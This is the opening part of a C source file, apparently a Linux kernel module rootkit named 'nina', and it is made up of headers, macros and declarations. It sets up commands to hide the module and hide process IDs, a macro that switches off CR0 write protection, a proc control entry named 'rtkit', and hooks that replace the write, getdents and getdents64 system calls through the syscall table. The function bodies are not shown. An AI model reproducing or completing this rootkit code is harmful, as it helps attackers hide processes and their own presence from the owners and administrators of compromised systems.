#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/kobject.h>
#include <linux/kallsyms.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/slab.h>     /* kmalloc */
#include <linux/signal.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");

#define MODULE_NAME "nina"
#define MAX_HIDDEN_PIDS 5
#define MAX_PID_LENGTH 6

#define HIDE_MOD_CMD "hide"
#define SHOW_MOD_CMD "show"
#define HIDE_PID_CMD "hpid"
#define SHOW_PID_CMD "spid"
#define KILL_NINA_PID "kill"

#define PROC_V "/proc/version"
#define BOOT_PATH "/boot/System.map-"
#define MAX_VERSION_LEN   256

#define GPF_DISABLE() write_cr0(read_cr0() & (~0x10000))
#define GPF_ENABLE() write_cr0(read_cr0() | 0x10000)

static struct proc_dir_entry *proc_rtkit;
static struct proc_dir_entry *proc_root;

static char module_hidden = 0;
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static int temp;
static char desc[50];

unsigned long* syscall_table;

/* Re-writing proc_dir_entry, removed from Linux kernel since 3.10 */
struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;
		atomic_t in_use;
		struct completion *pde_unload_completion;
		struct list_head pde_openers;
		spinlock_t pde_unload_lock;
		u8 namelen;
		char name[];
};

/* Re-writing linux_dirent since there is no .h with it... */
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[1];
};

asmlinkage long (*original_write)(unsigned int,
                                  const char __user *,
                                  size_t);
asmlinkage long (*original_getdents64)(unsigned int,
                                	   struct linux_dirent64 __user *,
                                	   unsigned int);

asmlinkage long (*original_getdents)(unsigned int,
                                	 struct linux_dirent __user *,
                                	 unsigned int);

asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s);
asmlinkage long custom_getdents64(unsigned int fd,
								  struct linux_dirent64 __user *dirp,
								  unsigned int count);
asmlinkage long custom_getdents(unsigned int fd,
								struct linux_dirent __user *dirp,
								unsigned int count);
static int procfs_init(void);
static void procfs_clean(void);
static void new_systable(void);
static void old_systable(void);
static ssize_t rtkit_read(struct file *file, char __user *buffer,
													size_t count, loff_t *ppos);
static ssize_t rtkit_write(struct file *file, const char __user *buffer,
													size_t count, loff_t *ppos);
static unsigned long **get_syscall_table(void);

void module_hide(void);
void module_show(void);
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);
